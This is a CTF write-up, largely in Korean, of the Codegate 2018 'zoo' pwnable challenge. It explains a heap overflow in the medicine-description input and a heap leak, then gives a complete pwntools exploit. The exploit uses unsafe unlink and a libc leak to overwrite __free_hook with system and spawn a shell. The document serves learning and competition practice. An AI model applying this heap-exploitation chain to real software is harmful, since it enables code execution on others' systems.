---
layout:     post
title:      "Codegate 2018 zoo write-up"
subtitle:   "codegate 2018 prequals pwnable"
date:       2018-02-15
author:     "NextLine"
header-img: "img/post-bg-1.png"
tags:
    - WriteUp
---

# Codegate 2018 prequals zoo write-up

### 1. Intro

unsafe ulink에 대한 이해도를 높이는데 많은 도움을 주었다.



### 2. Binary

```
-----------* My Own Zoo *-----------
[1] Adopt an animal
[2] Feed an animal
[3] Clean an amimal house
[4] Take a walk with an animal
[5] Take an animal to the hospital
[6] List animal info
[7] Close the zoo
------------------------------------
```

위와 같이 7개의 메뉴로 이루어져 있다.

1. Adopt an animal
   - 동물을 입양시킨다. (name, type)
2. Feed an animal
   - 동물에게 음식을 주거나 약을 준다.
   - 음식을 주면 food chunk를 할당하며, 간간히 dung chunk도 할당한다.
   - 약을 줄때에는 동물이 병에 걸려 의사에게 약 처방을 받았을 때이며, 약의 정보를 입력한다. (name, description)
3. Clean an animal
   - 동물의 dung chunk를 free한다.
4. Take a walk
   - 동물의 food chunk를 free한다.
   - 만약 동물이 food나 medicine이 아닌 다른걸 가지고있다면, 그곳에 주인의 메세지를 남길 수 있다.
5. Take an animal to the hospital
   - 동물의 dung chunk를 5개 free한다.
   - 만약 그 이후에도 dung chunk가 5개 이상이라면 약을 처방한다.
6. List animal info
   - 동물의 상태를 보여준다. (Name, Species, Likes, Get Food, Get Dung, healthy info)
7. Close the zoo
   - 프로그램을 종료한다.



### 3. Vulnerability

```c
      ...		
      puts("------------------------------------");
      printf("[+] Your animal %s is ill now. :(\n", *&a1->name[8 * (animal_idx + 2LL)] + 4LL);
      puts("[+] You can only feed medicines to your animal.");
      printf("[+] Please tell me the name of this medicine\n>> ");
      read(0, (*(*&a1->name[8 * (animal_idx + 2LL)] + 8 * (food_cnt + 2LL) + 8) + 16LL), 8uLL);
      printf("[+] Please tell me a description of this medicine\n>> ");
      read(0, (*(*&a1->name[8 * (animal_idx + 2LL)] + 8 * (food_cnt + 2LL) + 8) + 24LL), 0x78uLL);// heap_overflow
      
      ...
```

동물에게 약을 처방할때 heap overflow가 발생하여 다음 chunk 의 prev_size와 size를 덮을 수 있다.<br>또한 이름을 입력하고 그뒤에 바로 food_chunk가 할당되어, 이름을 출력할때 heap_leak을 얻을 수 있다.



### 4. Exploit

Unsafe Unlink를 heap chunk를 대상으로 해주면 된다. 그러면 4번의 메뉴로 animal structure를 overwrite하여 arbitrary read/write가 가능하다.

```python
from pwn import *

s = process('./zoo')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def adopt(idx,name):
	s.sendlineafter('>> ', '1')
	s.sendlineafter('>> ', idx)
	s.sendafter('>> ', name)

def feed(name):
	s.sendlineafter('>> ', '2')
	s.sendafter('>> ', name)

def feed_medi(name,medi_name,description):
	s.sendlineafter('>> ', '2')
	s.sendafter('>> ', name)
	s.sendafter('>> ', medi_name)
	s.sendafter('>> ', description)

def clean(name):
	s.sendlineafter('>> ', '3')
	s.sendafter('>> ', name)

def walk(name):
	s.sendlineafter('>> ', '4')
	s.sendafter('>> ', name)

def hospital(name):
	s.sendlineafter('>> ', '5')
	s.sendafter('>> ', name)

def a_list(name):
	s.sendlineafter('>> ', '6')
	s.sendafter('>> ', name)


s.sendlineafter('>> ', '/bin/sh')

adopt('1','A' * 20)
feed('A' * 20)
s.recvuntil('A' * 20)
heap = u64(s.recv(6) + "\x00" * 2)
target = heap - 0x6a8 + 0x8
log.info("HEAP : " + hex(heap))
log.info("TARGET : " + hex(target))

adopt('1','A' * 10)
for _ in xrange(20):
	feed('A' * 10)
for _ in xrange(20):
	walk('A' * 10)
for _ in xrange(20):
	feed('A' * 10)
for _ in xrange(20):
	walk('A' * 10)

payload = p64(target - 0x18)
payload2 = p64(target - 0x10)
payload2 += '\x00' * 0x60 + p64(0x80) + p64(0x90)

hospital('A' * 10)
adopt('1','A' * 5)

for _ in xrange(1):
	for _ in xrange(20):
		feed('A' * 5)
	for _ in xrange(20):
		walk('A' * 5)
for _ in xrange(8):
	clean('A' * 5)

clean('A' * 10)
feed_medi('A' * 10,'NEXTLINE','NEXTLINE')
feed('A' * 5)
feed_medi('A' * 10, payload , payload2)

for _ in xrange(2):
	clean('A' * 10)

walk('A' * 10)
payload3 = p64(target+0xe80)
payload3 += p64(target+0x1150)
payload3 += p64(target-0x210) # /bin/sh
payload3 += p64(target+0x60)
payload3 += p64(target+0x70)
s.sendafter('>> ',payload3)

s.sendafter('>> ','\x00')
s.sendafter('>> ','\x00')
s.sendafter('>> ','\x00')
s.sendafter('>> ',p64(0x0) * 2 + p64(target+0x970))

a_list('A' * 10)
s.recvuntil('[-] Species : ')
libc = u64(s.recv(6) + "\x00" *2) - 1176 - l.symbols['__malloc_hook']
log.info("LIBC : " + hex(libc))

walk('A' * 10)
s.sendafter('>> ','\x00')
s.sendafter('>> ','\x00')
s.sendafter('>> ','\x00')
s.sendafter('>> ',p64(0) + p64(libc + l.symbols['__free_hook']-0x18))
s.sendafter('>> ','\x00')

walk('A' * 10)
s.sendafter('>> ','\x00')
s.sendafter('>> ','\x00')
s.sendafter('>> ','\x00')
s.sendafter('>> ',p64(libc + l.symbols['system']))

walk('A' * 10)
s.interactive()
```
